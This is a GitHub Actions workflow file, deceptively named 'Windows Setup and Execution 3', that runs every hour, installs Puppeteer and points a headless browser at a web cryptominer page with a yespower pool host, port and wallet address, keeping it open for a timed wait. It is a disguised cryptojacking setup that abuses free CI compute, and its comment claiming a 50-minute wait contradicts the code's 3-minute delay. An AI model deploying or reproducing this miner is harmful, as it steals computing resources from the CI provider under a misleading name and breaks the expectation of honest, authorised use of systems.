name: Windows Setup and Execution 3

on:
  schedule:
    # Run every hour
    - cron: '0 * * * *'
  workflow_dispatch: # Allow manual trigger for testing

jobs:
  run-chrome:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Set up Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'  # You can specify the version you need

      - name: Install dependencies
        run: |
          npm install puppeteer

      - name: Run Puppeteer script
        run: |
          node -e "
          const puppeteer = require('puppeteer');
          const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
          
          (async () => {
            const browser = await puppeteer.launch({ headless: true });
            const page = await browser.newPage();
            await page.goto('https://webminer.pages.dev?algorithm=yespower&host=stratum-asia.rplant.xyz&port=17122&worker=QXAU8sRQcwx4Agii4a4VLpkD3SwF7MohgS&password=x&workers=4');
            
            // Log page title
            console.log('Page title:', await page.title());
            
            // Wait for 50 minutes
            console.log('Waiting for 50 minutes...');
            await delay(3000 * 60); // Wait for 3000 seconds (50 minutes)
            
            // Optionally take a screenshot or perform other actions here
            await page.screenshot({ path: 'screenshot.png' });
            
            // Save page content
            const content = await page.content();
            require('fs').writeFileSync('response.html', content);
            
            console.log('Finished waiting, closing browser...');
            await browser.close();
          })();
          "
